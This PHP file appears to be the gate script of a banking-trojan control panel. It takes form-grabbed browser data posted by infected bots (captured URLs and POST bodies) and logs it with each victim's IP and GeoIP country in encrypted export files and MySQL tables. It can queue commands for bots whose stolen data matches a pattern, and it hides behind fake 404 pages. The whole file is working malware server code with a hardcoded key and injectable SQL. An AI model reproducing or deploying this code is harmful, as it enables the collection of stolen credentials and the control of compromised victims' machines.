<?php

$dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
if($config['scramb'] == 1 && $gateway != true){
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");

	print(file_get_contents($dir . '404.html'));
	exit;
}

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.rc.php');

include_once($dir . 'includes/functions.a.charset.php');
include_once($dir . 'includes/functions.encoding.php');

// CREATE TABLE IF NOT EXISTS bf_logs_20110720 LIKE bf_logs

function start_db(){	global $dir, $mysqli, $dn;

	//SELECT DATE_FORMAT( CURRENT_TIMESTAMP(), '%H' ) date
	include_once($dir . 'includes/functions.get_config.php');
	$cfg_db = get_config();

	$mysqli = new mysqli($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);

	if(mysqli_connect_errno()){
		header("HTTP/1.1 404 Not Found");
		header("Status: 404 Not Found");

		print(file_get_contents($dir . '404.html'));
		exit;
	}

	if(!file_exists($dir . 'cache/logs/' . $dn)){
		$mysqli->query('CREATE TABLE IF NOT EXISTS bf_logs_'.$dn.' LIKE bf_logs');
		file_put_contents($dir . 'cache/logs/' . $dn, date('d.m.Y'));
	}
}

function start_brw(){	global $brw;
	switch($_POST['brw']){
		case 1: $brw = 'IE'; break;
		case 2: $brw = 'FF'; break;
		case 3: $brw = 'OPERA'; break;
		default: $brw = $_POST['brw']; break;
	}
}

function start_country(){
	global $country, $dir;
	if(function_exists('geoip_country_code_by_name')){
		$country = geoip_country_code_by_name($_SERVER['REMOTE_ADDR']);
	}else{
		if(file_exists($dir . 'cache/geoip/')){
			require_once($dir . 'cache/geoip/geoip.inc');
			$gi = geoip_open($dir . 'cache/geoip/GeoIP.dat',GEOIP_STANDARD);
			$country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
			geoip_close($gi);
			unset($gi);
		}
	}
	if(empty($country)) $country = 'UNK';
}

function getlog(){	global $config;
	if($config['getlog'] == 1){		print_data('403', true);
		exit;
	}
}


if(!empty($_POST['data']) && !empty($_POST['type'])){
	switch($_POST['type']){
		case '1':
			if($config['getlog'] != 1){
				if(strlen($_POST['data']) > 10240){
					print_data('403', true);
					exit;
				}
				
				$dn = date('dmY');
				
				start_db();
				start_brw();
				start_country();
			}
			
			$write = true;
			@file_put_contents($dir . 'cache/last_time.txt', date('d.m.Y_G'));
			
			$pdata = explode('?|POST:', $_POST['data'], 2);
			
			if(isset($pdata[1]) && !empty($pdata[1])){
				$rc_key = 'TnqbwNDcXdYFEw1Bh3j1ba2yC305aRAP';
				
				if($_POST['cc'] === 1){
					file_put_contents($dir . 'logs/export/fgr/' .  date('d.m.Y_G') . '.gz.txt', $_POST['prefix'] . '[,]' . $_POST['uid'] . '[,]' . $_SERVER['REMOTE_ADDR'] . '[,]' . $_POST['brw'] . '[,]LOG:' . gzdeflate(rc_encode_aes(urldecode($_POST['data']), $rc_key), 5) . '[,]' . '1[~]', FILE_APPEND);
				}else{
					file_put_contents($dir . 'logs/export/fgr/' .  date('d.m.Y_G') . '.gz.txt', $_POST['prefix'] . '[,]' . $_POST['uid'] . '[,]' . $_SERVER['REMOTE_ADDR'] . '[,]' . $_POST['brw'] . '[,]LOG:' . gzdeflate(rc_encode_aes(urldecode($_POST['data']), $rc_key), 5) . '[~]', FILE_APPEND);
				}
				
				getlog();
				
				if(!empty($config['hist']['l'])){
					$config['hist']['l'] = @base64_decode($config['hist']['l']);
					if(!empty($config['hist']['c']) && preg_match('~(.*)('.$config['hist']['l'].')(.*)~is', $_POST['data'])){
						$mysqli->query('update bf_bots set cmd = \'$'.$config['hist']['c'].'\' WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');
					}
				}
				
				if(!$mysqli->real_query('INSERT DELAYED INTO bf_logs_'.$dn.' (prefix, uid, url, data, brw, protocol, ip, country, type, hour) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$pdata[0].'\', \''.$pdata[1].'\', \''.$brw.'\', \''.@parse_url($pdata[0], PHP_URL_SCHEME).'\', \''.$_SERVER['REMOTE_ADDR'].'\', \''.$country.'\', \'1\', DATE_FORMAT(CURRENT_TIMESTAMP(),\'%H\'))')) $write = false;
			}else{
				getlog();
				
				if(isset($pdata[1]) && empty($pdata[1])){
					$write = true;
				}else{
					$write = false;
				}
			}
			
			if($write == true){
				print_data('403', true);
			}else{
				header("HTTP/1.1 404 Not Found");
				header("Status: 404 Not Found");
				
				print(file_get_contents($dir . '404.html'));
				exit;
			}
		break;
		
		case '2':
			if($config['getinj'] == 1){
				print_data('403', true);
				exit;
			}
			
			$dn = date('dmY');
			
			start_db();
			start_brw();
			start_country();
			
			$write = true;
			
			@file_put_contents($dir . 'cache/last_time.txt', date('d.m.Y_G'));
			
			$_POST['data'] = html_entity_decode(preg_replace('~<script(.*)</script>~isU', '', strip_tags($_POST['data'], '<script>')));
			$pdata = explode('|', $_POST['data'], 2);
			
			if(!$mysqli->real_query('INSERT DELAYED INTO bf_logs_'.$dn.' (prefix, uid, url, data, brw, protocol, ip, country, type, hour) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$pdata[0].'\', \''.$pdata[1].'\', \''.$brw.'\', \''.@parse_url($pdata[0], PHP_URL_SCHEME).'\', \''.$_SERVER['REMOTE_ADDR'].'\', \''.$country.'\', \'2\', DATE_FORMAT(CURRENT_TIMESTAMP(),\'%H\'))')) $write = false;
			
			if(file_exists($dir . 'modules/cabs/index.php')){
				if(strpos($pdata[1], 'BSS Ball') !== false){
					$uot = explode('::', $t, 3);
					$cid = $mysqli->query('SELECT id, prefix, uid, comment FROM bf_comments WHERE (prefix = \''.$_POST['prefix'].'\') AND (UID = \''.$_POST['uid'].'\') AND (type = \'bss\') LIMIT 1');
					if($cid->prefix == $_POST['prefix'] && $cid->uid == $_POST['uid']){
						if(strpos($c->comment, '{') != false){
							$mysqli->query('update bf_comments set comment = \' '. preg_replace('~([ ]+)~is', ' ', preg_replace('~ {(.*)} ~isU', ' {' . $out[1] . '} ', $cid->comment)) . ' \' WHERE (id = \''.$cid->id.'\')');
						}else{
							$mysqli->query('update bf_comments set comment = \'' . $cid->comment . ' {' . $out[1] . '} \' WHERE (id = \''.$cid->id.'\')');
						}
					}else{
						$mysqli->query('INSERT DELAYED INTO bf_comments (prefix, uid, comment, type) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \' {'.$out[1].'} \', \'bss\')');
					}
				}
			}
			
			if($write == true){
				print_data('403', true);
			}else{
				header("HTTP/1.1 404 Not Found");
				header("Status: 404 Not Found");
				
				print(file_get_contents($dir . '404.html'));
				exit;
			}
		break;
	}
}else{
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
		
	print(file_get_contents($dir . '404.html'));
	exit;
}


?>